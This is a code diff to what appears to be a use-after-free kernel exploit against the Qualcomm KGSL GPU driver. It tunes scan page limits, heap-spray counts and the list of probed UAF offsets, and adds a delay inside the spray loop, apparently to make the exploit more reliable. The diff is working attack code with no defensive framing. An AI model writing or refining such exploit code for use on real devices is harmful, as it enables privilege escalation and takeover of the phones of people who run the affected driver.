@@ -42,7 +42,7 @@
 #define UAF_SIZE             0x10004000ULL
 #define UAF_SCAN_SIZE        0x04000000ULL
 #define SCAN_PAGE_STEP       2U
-#define SCAN_MAX_PAGES       2048U
+#define SCAN_MAX_PAGES       1024U
 #define SCAN_PROGRESS_EVERY  128U
 #define OVERLAP_START        0x7001FE000ULL
 #define OVERLAP_SIZE         0x00007000ULL
@@ -126,9 +126,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 5000
+#define SPRAY_COUNT 4000
 #define SPRAY_COUNT_STEP 500
-#define SPRAY_COUNT_MAX 5000
+#define SPRAY_COUNT_MAX 4000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1760,10 +1760,9 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fflush(stderr);
 
     uint64_t uaf_base_offsets[] = {
-        0x780, 0x0, 0x800, 0x400, 0xc00, 0x200, 0xa00, 0x600, 0xe00,
-        0x100, 0x300, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
-        0x080, 0x180, 0x280, 0x380, 0x480, 0x580, 0x680, 0x780,
-        0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
+        0x780, 0x0, 0x800, 0x400, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
+        0xc00, 0xa00, 0x600, 0xe00, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
+        0x080, 0x480, 0x580, 0x680, 0x780, 0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
     int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
     int marker_found = 0;
     int pages_scanned = 0;
@@ -2771,6 +2770,8 @@ restart:;
             if (i % 1000 == 0) {
                 fprintf(stderr, "[SPRAY %d] Started, PID=%d\n", i, self);
             }
+            
+            usleep(10000); // Wait 10ms to let system breathe
 
             while (1)
             {
